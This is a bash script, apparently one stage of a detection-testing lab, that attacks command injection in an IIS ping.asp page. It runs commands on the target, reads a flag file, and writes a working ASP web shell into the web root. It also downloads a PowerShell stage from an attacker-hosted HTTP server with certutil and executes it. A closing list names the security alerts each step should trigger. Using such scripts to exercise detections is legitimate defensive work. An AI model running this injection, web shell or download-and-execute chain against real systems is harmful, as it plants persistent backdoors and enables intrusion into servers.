#!/usr/bin/env bash
# Stage 3 — the second way in: command injection in ping.asp. Drops a
# web shell (FIM), reads the IIS flag, and pulls a stage2 script with
# certutil (lol-certutil) then encoded PowerShell (ps-enc).
set -euo pipefail
. "$(dirname "$0")/lib.sh"

need curl "curl"
need python3 "payload server + EncodedCommand helper"

check_target

say "confirming the injection: ping.asp?ip=127.0.0.1 & whoami"
rce 'whoami' | strip

say "reading the IIS flag"
rce 'type C:\inetpub\wwwroot\flag.txt' | strip

say "dropping a web shell under the document root"
rce_ps "Set-Content -Path 'C:\\inetpub\\wwwroot\\shell.asp' -Encoding ASCII -Value '<%Set sh=Server.CreateObject(\"WScript.Shell\"):Set x=sh.Exec(\"cmd.exe /c \"&Request(\"c\")):Response.Write x.StdOut.ReadAll()%>'"

say "serving stage2.ps1 on $HOST_IP:8000 and pulling it onto the target"
STAGE=$(mktemp -d)
cleanup() {
  kill "$(cat "$STAGE/pid" 2>/dev/null)" 2>/dev/null || true
  rm -rf "$STAGE"
}
trap cleanup EXIT
cat > "$STAGE/stage2.ps1" <<'EOF'
# stage2 — post-exploitation recon
whoami /priv
hostname
Get-ChildItem C:\inetpub\wwwroot | Select-Object Name
EOF
(
  cd "$STAGE"
  python3 -m http.server 8000 >/dev/null 2>&1 &
  echo $! >"$STAGE/pid"
)
up=0
for _ in $(seq 10); do
  if curl -sf -m 2 "http://$HOST_IP:8000/stage2.ps1" >/dev/null; then up=1; break; fi
  sleep 0.5
done
[[ $up == 1 ]] || die "payload server did not come up on $HOST_IP:8000 (port busy?)"

rce "certutil -urlcache -split -f http://$HOST_IP:8000/stage2.ps1 C:\Windows\Temp\stage2.ps1"
rce_ps "& 'C:\\Windows\\Temp\\stage2.ps1'"
trap - EXIT
cleanup

note "expected on the target:"
note "  process  CRITICAL flag-access — C:\\inetpub\\wwwroot\\flag.txt"
note "  file     FIM event — new file under C:\\inetpub\\wwwroot\\ (shell.asp)"
note "  process  HIGH    lol-certutil — certutil -urlcache"
note "  process  HIGH    ps-enc — EncodedCommand"
note "  process  LOW     recon-whoami-priv — whoami /priv"
note "  network          outbound connection to $HOST_IP:8000"
note "  process  INFO    every exec above (log_all_process_events)"
